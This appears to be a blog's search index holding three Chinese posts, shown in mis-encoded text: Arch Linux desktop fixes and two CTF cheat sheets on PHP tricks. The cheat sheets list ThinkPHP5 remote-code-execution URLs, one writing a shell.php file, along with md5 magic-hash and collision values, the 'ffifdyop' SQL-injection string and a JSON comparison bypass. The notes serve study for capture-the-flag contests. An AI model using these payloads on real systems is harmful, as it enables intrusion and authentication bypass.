<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ArchLinuxä¸‹å¥‡æ€ªå°é—®é¢˜çš„è§£å†³</title>
    <url>/2020/10/18/ArchLinux%E4%B8%8B%E5%A5%87%E6%80%AA%E5%B0%8F%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>ArchLinux é…åˆKDE Plasmaä½œä¸ºä¸€ä¸ªæ¡Œé¢ç³»ç»Ÿæ¥ä½¿ç”¨ï¼Œç›¸å½“å¥½ç”¨ã€‚ä¸è¿‡ä¹Ÿæœ‰ä¸€äº›ç—›ç‚¹å’Œç—’ç‚¹éœ€è¦è‡ªå·±è¸©å‘ã€‚æŠŠè¸©å‘è¿‡ç¨‹æ”¾åœ¨è¿™é‡Œæ•´ç†ä¸€ä¸‹ã€‚æŒç»­æ›´æ–°(<del>å¤§æ¦‚</del>)</p>
<a id="more"></a>

<h2 id="Plasma-discover-æ— æ³•è”ç½‘"><a href="#Plasma-discover-æ— æ³•è”ç½‘" class="headerlink" title="Plasma-discover æ— æ³•è”ç½‘"></a>Plasma-discover æ— æ³•è”ç½‘</h2><h3 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h3><p>è£…äº†ä¸ªæ¯”è¾ƒçº¯å‡€çš„Archç³»ç»Ÿï¼Œæ²¡æœ‰å®‰è£…kde-applicationsåŒ…ç»„ï¼Œå‘ç°plasma-discoveræ— æ³•è”ç½‘ï¼Œæ˜¾ç¤º<code>Unable to load applications. Please verify Internet connectivity</code>ã€‚</p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>é—®é¢˜çš„äº§ç”Ÿæ˜¯ç”±äºç¼ºå°‘kde-applicationåŒ…ç»„é‡Œçš„ä¸€äº›åŒ…ã€‚ä¸è¿‡è¿™ä¸ªåŒ…ç»„å®åœ¨è‡ƒè‚¿ï¼Œæˆ‘ä¸æ„¿æ„è£…å®ƒã€‚æ‰€ä»¥å»å®šä½é€ æˆé—®é¢˜çš„åŒ…äº†ã€‚æœ€åå‘ç°é€ æˆé—®é¢˜çš„åŒ…æ˜¯ <code>packagekit-qt5</code> å’Œ <code>appstream</code> è¿™ä¸¤ä¸ªã€‚æ‰€ä»¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S packagekit-qt5 appstream</span><br></pre></td></tr></table></figure>

<p>é—®é¢˜è§£å†³ã€‚</p>
<h2 id="åŒç³»ç»Ÿæƒ…å†µä¸‹Windowsç£ç›˜æ— æ³•è‡ªåŠ¨æŒ‚è½½"><a href="#åŒç³»ç»Ÿæƒ…å†µä¸‹Windowsç£ç›˜æ— æ³•è‡ªåŠ¨æŒ‚è½½" class="headerlink" title="åŒç³»ç»Ÿæƒ…å†µä¸‹Windowsç£ç›˜æ— æ³•è‡ªåŠ¨æŒ‚è½½"></a>åŒç³»ç»Ÿæƒ…å†µä¸‹Windowsç£ç›˜æ— æ³•è‡ªåŠ¨æŒ‚è½½</h2><h3 id="é—®é¢˜æè¿°-1"><a href="#é—®é¢˜æè¿°-1" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h3><p>æˆ‘ä½¿ç”¨äº†Archå’ŒWin10çš„åŒç³»ç»Ÿã€‚æ¯æ¬¡éœ€è¦è®¿é—®Win10ç¡¬ç›˜åˆ†åŒºä¸­çš„å†…å®¹éƒ½è¦æ‰‹åŠ¨é‡æ–°æŒ‚è½½è€Œä¸”éœ€è¦ç”¨æˆ·å¯†ç ã€‚æ‡’ç‹—è§‰å¾—è¿™æ ·ä¸è¡Œï¼Œå¿…é¡»æŠŠè¿™ä¸ªé—®é¢˜è§£å†³äº†æ‰èƒ½å«åšæ‡’ç‹—ã€‚</p>
<h3 id="è§£å†³æ–¹æ¡ˆ-1"><a href="#è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>é¦–å…ˆè§£å†³æ¯æ¬¡éƒ½éœ€è¦æ‰‹åŠ¨æŒ‚è½½çš„é—®é¢˜ã€‚æˆ‘å…ˆè®©å®ƒæ¥ä¸ªè‡ªåŠ¨æŒ‚è½½ã€‚å…ˆæŸ¥çœ‹ä¸€ä¸‹åˆ†åŒºçœ‹çœ‹è‡ªå·±éœ€è¦æŒ‚è½½å“ªäº›å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p>æˆ‘éœ€è¦æŒ‚è½½çš„æ˜¯ä¸¤ä¸ªåˆ†åŒºï¼Œä¸€ä¸ªæ˜¯ <code>/dev/nvme0n1p3</code> ï¼ˆCç›˜ï¼‰ï¼Œä¸€ä¸ªæ˜¯ <code>/dev/nvme0n1p5</code> ï¼ˆDç›˜ï¼‰ã€‚æ‰€ä»¥ç¼–è¾‘ä¸€ä¸‹fstabçš„å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br></pre></td></tr></table></figure>

<p>åœ¨æ–‡ä»¶çš„æœ€ååŠ ä¸Šè¿™æ ·å‡ å¥ï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># /dev/nvme0n1p3</span></span><br><span class="line"><span class="meta-keyword">/dev/</span>nvme0n1p3          <span class="meta-keyword">/run/</span>media<span class="meta-keyword">/muted/</span>Windows/  ntfs        rw,relatime     <span class="number">0</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># /dev/nvme0n1p5</span></span><br><span class="line"><span class="meta-keyword">/dev/</span>nvme0n1p5          <span class="meta-keyword">/run/</span>media<span class="meta-keyword">/muted/</span>DATA/      ntfs        rw,relatime     <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œ<del>æ„æ€å°±æ˜¯ä½ ç…§æŠ„ä¸Šé¢è¿™ä»½ä¼°è®¡ä¸€èˆ¬ä¸å¾—è¡Œï¼ˆ</del></p>
<p>æ¥ä¸‹æ¥è§£å†³éœ€è¦è¾“å…¥å¯†ç çš„é—®é¢˜ã€‚STFWä¹‹åå‘ç°è¿™ä¸ªå¯†ç çš„é…ç½®åœ¨ <code>/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy  </code> è¿™é‡Œã€‚å¤‡ä»½ä¸€ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sudo cp /usr/share/polkit-<span class="number">1</span>/actions/org<span class="selector-class">.freedesktop</span><span class="selector-class">.UDisks2</span><span class="selector-class">.policy</span> org<span class="selector-class">.freedesktop</span><span class="selector-class">.UDisks2</span><span class="selector-class">.policy</span>.bak</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸€ä¸‹æ–‡ä»¶é‡Œ <code>&lt;action id=&quot;org.freedesktop.udisks2.filesystem-mount-system&quot;&gt;</code> çš„ç›¸å…³é…ç½®ï¼ŒæŠŠ <code>&lt;allow_active&gt;</code> æ ‡ç­¾é‡Œçš„ <code>auth_admin_keep</code> æ”¹æˆ <code>yes</code> ã€‚æˆ‘çš„æ˜¯åœ¨173è¡Œï¼Œå½“ç„¶è¿™ä¹Ÿéœ€è¦å…·ä½“æƒ…å†µå…·ä½“åˆ†æäº†ã€‚</p>
<p>é‡å¯ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸¤å—åˆ†åŒºè‡ªåŠ¨æŒ‚è½½åˆ°äº†/run/media/ä¸‹é¢ã€‚æˆäº†ï¼</p>
]]></content>
      <categories>
        <category>ç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­çç¢çš„å§¿åŠ¿ä»¬</title>
    <url>/2020/06/16/CTF%E4%B8%AD%E7%90%90%E7%A2%8E%E7%9A%84%E5%A7%BF%E5%8A%BF%E4%BB%AC/</url>
    <content><![CDATA[<p>è®°å½•CTFä¸­çš„ä¸€äº›çç¢æ‚é¡¹å¤‡å¿˜ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚</p>
<a id="more"></a>

<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="HTMLä¸­çš„ç‰¹æ®Šè½¬ä¹‰å­—ç¬¦"><a href="#HTMLä¸­çš„ç‰¹æ®Šè½¬ä¹‰å­—ç¬¦" class="headerlink" title="HTMLä¸­çš„ç‰¹æ®Šè½¬ä¹‰å­—ç¬¦"></a>HTMLä¸­çš„ç‰¹æ®Šè½¬ä¹‰å­—ç¬¦</h3><table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>åè¿›åˆ¶</th>
<th>è½¬ä¹‰å­—ç¬¦</th>
</tr>
</thead>
<tbody><tr>
<td>â€œ</td>
<td><code>&amp;#34;</code></td>
<td><code>&amp;quot;</code></td>
</tr>
<tr>
<td>&amp;</td>
<td><code>&amp;#38;</code></td>
<td><code>&amp;amp;</code></td>
</tr>
<tr>
<td>&lt;</td>
<td><code>&amp;#60;</code></td>
<td><code>&amp;lt;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td><code>&amp;#62;</code></td>
<td><code>&amp;gt;</code></td>
</tr>
<tr>
<td>ä¸æ–­å¼€ç©ºæ ¼(non-breaking space)</td>
<td><code>&amp;#160;</code></td>
<td><code>&amp;nbsp;</code></td>
</tr>
<tr>
<td>|</td>
<td><code>&amp;#166;</code></td>
<td><code>&amp;brvbar;</code></td>
</tr>
</tbody></table>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><h3 id="swp-swo-â€¦-æ–‡ä»¶"><a href="#swp-swo-â€¦-æ–‡ä»¶" class="headerlink" title=".swp/.swo/â€¦ æ–‡ä»¶"></a>.swp/.swo/â€¦ æ–‡ä»¶</h3><p>è¿™äº›æ–‡ä»¶æ˜¯vimåˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶ã€‚ä¸€ä¸ªæ–‡ä»¶åœ¨vimä¸­æ‰“å¼€ä¹‹åä¼šåˆ›å»º .swp æ–‡ä»¶ã€‚å¦‚æœ .swp æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åˆ›å»º .swo æ–‡ä»¶ï¼Œè‹¥ .swo æ–‡ä»¶å­˜åœ¨åˆ™åˆ›å»º .swn æ–‡ä»¶ï¼Œä»¥æ­¤ç±»æ¨ã€‚vim å…³é—­æ—¶è¿™äº›æ–‡ä»¶å°†è‡ªåŠ¨è¢«åˆ é™¤ï¼Œè‹¥vimå´©æºƒæˆ–è¢«æ€æ­»ï¼Œåˆ™ä¿ç•™ã€‚æœ‰æ—¶å¯ç”¨ä½œ CTF ä¸­æºç çš„æ¥æºã€‚</p>
<p>ä¾‹å¦‚ï¼šä¸€ä¸ªå« <code>abc.php</code> çš„æ–‡ä»¶ä¼šäº§ç”Ÿä¸€ä¸ªåä¸º <code>.abc.php.swp</code> çš„ä¸´æ—¶æ–‡ä»¶ã€‚æ³¨æ„æ–‡ä»¶æœ€å‰é¢æœ‰ä¸€ä¸ªå°ç‚¹ã€‚</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="PHPåŸºç¡€"><a href="#PHPåŸºç¡€" class="headerlink" title="PHPåŸºç¡€"></a>PHPåŸºç¡€</h3><h4 id="gt-gt-çš„åŒºåˆ«"><a href="#gt-gt-çš„åŒºåˆ«" class="headerlink" title="-&gt; , =&gt; , :: çš„åŒºåˆ«"></a>-&gt; , =&gt; , :: çš„åŒºåˆ«</h4><p><code>-&gt;</code> æ˜¯æ’å…¥å¼è§£å¼•ç”¨çš„ç¬¦å·ï¼Œç”¨æ³•ä¸Cè¯­è¨€ç›¸ä¼¼ã€‚<code>=&gt;</code> åœ¨æ•°ç»„ä¸­å¸¸å¸¸å‡ºç°ï¼Œç”¨æ¥è¿æ¥é”®å€¼å¯¹ã€‚<code>::</code> ä¸Cè¯­è¨€ä¸­çš„ <code>.</code> ç±»ä¼¼ï¼Œç”¨äºè°ƒç”¨ç±»çš„å†…éƒ¨æˆå‘˜ï¼Œæˆ–ç±»ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ã€‚</p>
<h3 id="phps"><a href="#phps" class="headerlink" title=".phps"></a>.phps</h3><p>æœåŠ¡å™¨é‡phpæ–‡ä»¶ä¼šè§£æã€‚æ­¤æ—¶è‹¥æƒ³è¦è¯»æºç è¦ä½¿ç”¨phpsæ–‡ä»¶ã€‚æºç æ³„éœ²çš„æ¥æºã€‚</p>
<h3 id="thinkphp5-RCE"><a href="#thinkphp5-RCE" class="headerlink" title="thinkphp5 RCE"></a>thinkphp5 RCE</h3><p>5.1.x phpç‰ˆæœ¬&gt;5.5</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p>5.0.x phpç‰ˆæœ¬&gt;=5.4</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯å‚è§<a href="https://y4er.com/post/thinkphp5-rce/#5020" target="_blank" rel="noopener"><strong>Thinkphp</strong>5 RCEæ€»ç»“ â€“ Y4erçš„åšå®¢</a>ã€‚</p>
<h2 id="é…ç½®é”™è¯¯"><a href="#é…ç½®é”™è¯¯" class="headerlink" title="é…ç½®é”™è¯¯"></a>é…ç½®é”™è¯¯</h2><h3 id="æºç æ³„éœ²"><a href="#æºç æ³„éœ²" class="headerlink" title="æºç æ³„éœ²"></a>æºç æ³„éœ²</h3><h4 id="å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€"><a href="#å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€" class="headerlink" title="å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€"></a>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€</h4><ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h4 id="å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å"><a href="#å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å" class="headerlink" title="å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å"></a>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å</h4><ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPç›¸å…³å§¿åŠ¿</title>
    <url>/2020/06/16/PHP%E7%9B%B8%E5%85%B3%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<p>æ•´ç† CTF ä¸­ PHP ç›¸å…³çš„åˆ©ç”¨å§¿åŠ¿ï¼Œä¸å®šæœŸè¡¥å……ã€‚</p>
<a id="more"></a>

<h2 id="å¼±ç±»å‹ç›¸å…³å§¿åŠ¿"><a href="#å¼±ç±»å‹ç›¸å…³å§¿åŠ¿" class="headerlink" title="å¼±ç±»å‹ç›¸å…³å§¿åŠ¿"></a>å¼±ç±»å‹ç›¸å…³å§¿åŠ¿</h2><p>å¼±ç±»å‹çš„è¯­è¨€å¯¹å˜é‡çš„æ•°æ®ç±»å‹æ²¡æœ‰é™åˆ¶ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ—¶å€™å°†å˜é‡èµ‹å€¼ç»™ä»»æ„çš„å…¶ä»–ç±»å‹çš„å˜é‡ï¼ŒåŒæ—¶å˜é‡ä¹Ÿå¯ä»¥è½¬æ¢æˆä»»æ„åœ°å…¶ä»–ç±»å‹çš„æ•°æ®ã€‚</p>
<h3 id="æ¯”è¾ƒæ“ä½œç¬¦"><a href="#æ¯”è¾ƒæ“ä½œç¬¦" class="headerlink" title="æ¯”è¾ƒæ“ä½œç¬¦"></a>æ¯”è¾ƒæ“ä½œç¬¦</h3><h4 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h4><p>å¼±ç­‰çš„æ¯”è¾ƒä¸­ä¸éœ€å·¦å³ä¸¤è¾¹çš„ç±»å‹ç›¸ç­‰ï¼Œä¼šç»è¿‡è½¬æ¢å˜æˆç›¸åŒçš„ç±»å‹åæ¯”è¾ƒï¼Œç”±æ­¤äº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">NULL</span>;$b=<span class="keyword">FALSE</span>;  <span class="comment">//$a==$b</span></span><br><span class="line">$a=<span class="string">''</span>;$b=<span class="keyword">NULL</span>;  <span class="comment">//$a==$b</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ï¼Œboolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰ã€‚</p>
<p>ä»¥åŠç±»å‹è½¬æ¢çš„ä¸€äº›è§„åˆ™ï¼Œå¦‚å­—ç¬¦ä¸²è½¬æ•°å­—ä¼šä»ä¸æ»¡è¶³è½¬æ¢è§„åˆ™çš„ä½ç½®å¼€å§‹æˆªæ–­åªå–æœ€å‰è¾¹çš„æ•°å­—éƒ¨åˆ†è€Œä¸ä¼šæŠ¥é”™ç­‰ã€‚ï¼ˆ æ³¨ï¼šæ•°å­—åˆ°å­—ç¬¦ä¸²å¯ä»¥ç”¨strval()ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—å¯ä»¥ç”¨intval() ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">'0'</span>		<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">'abcdefg'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> === <span class="string">'abcdefg'</span>	<span class="comment">//false</span></span><br><span class="line"><span class="number">1</span> == <span class="string">'1abcdef'</span>	<span class="comment">//true</span></span><br><span class="line"><span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h4 id="å“ˆå¸Œæ¯”è¾ƒ"><a href="#å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="å“ˆå¸Œæ¯”è¾ƒ"></a>å“ˆå¸Œæ¯”è¾ƒ</h4><h5 id="md5-å¼±ç­‰çš„ç»•è¿‡"><a href="#md5-å¼±ç­‰çš„ç»•è¿‡" class="headerlink" title="md5 å¼±ç­‰çš„ç»•è¿‡"></a>md5 å¼±ç­‰çš„ç»•è¿‡</h5><p>md5(â€˜240610708â€™) == md5(â€˜QNKCDZOâ€™) (0exxxxxxx)</p>
<p>åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†0e\d+è¿™ç§å­—ç¬¦ä¸²ï¼Œå°±ä¼šå°†è¿™ç§å­—ç¬¦ä¸²è§£æä¸ºç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸Šé¢ä¾‹å­ä¸­2ä¸ªæ•°çš„å€¼éƒ½æ˜¯0å› è€Œå°±ç›¸ç­‰äº†ã€‚å¦‚æœä¸æ»¡è¶³0e\d+è¿™ç§æ¨¡å¼å°±ä¸ä¼šç›¸ç­‰ã€‚</p>
<p>0e\d+ çš„å­—ç¬¦ä¸²æ•´ç†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure>



<p>å¼ºç­‰çš„ç»•è¿‡æ–¹æ³•æ”¾åœ¨åæ–‡çš„ å†…ç½®å‡½æ•°çš„å‚æ•°æ¾æ•£æ€§ ä¸€èŠ‚ä¸­ã€‚</p>
<h5 id="ç»•è¿‡-md5-å‡½æ•°æ³¨å…¥-MySQL"><a href="#ç»•è¿‡-md5-å‡½æ•°æ³¨å…¥-MySQL" class="headerlink" title="ç»•è¿‡ md5()å‡½æ•°æ³¨å…¥ MySQL"></a>ç»•è¿‡ md5()å‡½æ•°æ³¨å…¥ MySQL</h5><p><code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ or â€˜6ï¼ˆ<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>ï¼‰ï¼Œè€Œ Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯ <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code></p>
<p>ç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡ md5()å‡½æ•°ã€‚</p>
<p>æˆ–è€… 129581926211651571912466741651878684928ï¼Œ<br>md5 å€¼ä¸º <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code> ä¹Ÿå¯è¡Œã€‚</p>
<h4 id="åå…­è¿›åˆ¶è½¬æ¢"><a href="#åå…­è¿›åˆ¶è½¬æ¢" class="headerlink" title="åå…­è¿›åˆ¶è½¬æ¢"></a>åå…­è¿›åˆ¶è½¬æ¢</h4><p>è¿˜å­˜åœ¨ä¸€ç§åå…­è¿›åˆ¶ä½™å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶çš„é—®é¢˜ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="number">123456</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span>		<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>å½“å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯0xå¼€å¤´çš„æ—¶å€™ï¼ŒPHPä¼šå°†æ­¤å­—ç¬¦ä¸²è§£ææˆä¸ºåè¿›åˆ¶ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œ0x1e240è§£ææˆä¸ºåè¿›åˆ¶å°±æ˜¯123456ï¼Œæ‰€ä»¥ä¸ int ç±»å‹å’Œ string ç±»å‹çš„ 123456 æ¯”è¾ƒéƒ½æ˜¯ç›¸ç­‰ã€‚æ”»é˜²å¹³å°ä¸­çš„<strong>èµ·åå­—çœŸéš¾</strong>å°±æ˜¯è€ƒå¯Ÿçš„è¿™ä¸ªç‰¹æ€§ã€‚</p>
<h4 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key ==$key ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº$keyçš„å€¼ï¼Œä½†$keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“,è¿™æ—¶æˆ‘ä»¬æ„é€ ä¸€ä¸ªå’Œä»»æ„å­—ç¬¦ä¸²è¿”å›ä¸ºçœŸçš„æ•°ç»„{â€œkeyâ€:true}ã€‚å³å¯ç»•è¿‡ã€‚</p>
<p>payload: message={â€œkeyâ€,true}</p>
<h3 id="å†…ç½®å‡½æ•°çš„å‚æ•°æ¾æ•£æ€§"><a href="#å†…ç½®å‡½æ•°çš„å‚æ•°æ¾æ•£æ€§" class="headerlink" title="å†…ç½®å‡½æ•°çš„å‚æ•°æ¾æ•£æ€§"></a>å†…ç½®å‡½æ•°çš„å‚æ•°æ¾æ•£æ€§</h3><h4 id="md5-å¼ºç­‰çš„ç»•è¿‡"><a href="#md5-å¼ºç­‰çš„ç»•è¿‡" class="headerlink" title="md5()  å¼ºç­‰çš„ç»•è¿‡"></a>md5()  å¼ºç­‰çš„ç»•è¿‡</h4><p>md5()ä¸­çš„éœ€è¦æ˜¯ä¸€ä¸ªstringç±»å‹çš„å‚æ•°ã€‚å¦‚æœmd5 å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„å€¼ï¼Œä¼šå¯¼è‡´å‡½æ•°è¿”å› falseã€‚é™¤äº† md5 ä¹‹å¤– sha1 å‡½æ•°ä¹Ÿæœ‰è¿™ä¸ªç‰¹æ€§ã€‚ ä¾‹å¦‚ä¼ å…¥ä¸º <code>?a[]=1&amp;b[]=2</code></p>
<p> æˆ–è€…æ‰¾åˆ° md5 å€¼ç›¸ç­‰çš„äºŒè¿›åˆ¶æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

